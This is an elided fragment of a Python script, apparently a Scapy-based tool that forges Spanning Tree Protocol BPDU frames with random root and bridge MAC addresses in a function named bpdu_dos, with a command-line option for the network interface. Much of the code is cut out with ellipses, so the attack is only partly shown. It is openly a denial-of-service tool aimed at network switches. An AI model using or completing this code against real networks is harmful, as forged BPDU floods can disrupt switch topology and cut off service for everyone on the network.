...
from scapy.all import Ether, STP, LLC, sendp, sniff, RandMAC
...
def bpdu_dos(iface):
    ...
    stp = STP(
        rootid=choice(id_list),
        rootmac=randmac,
        bridgeid=choice(id_list),
        bridgemac=randmac,
    )
    pkt = ether / stp
...
def main():
    ...
    parser.add_argument(
        "-i", "--iface", default="eth0", help="The network interface of use"
    )
    parser.add_argument(
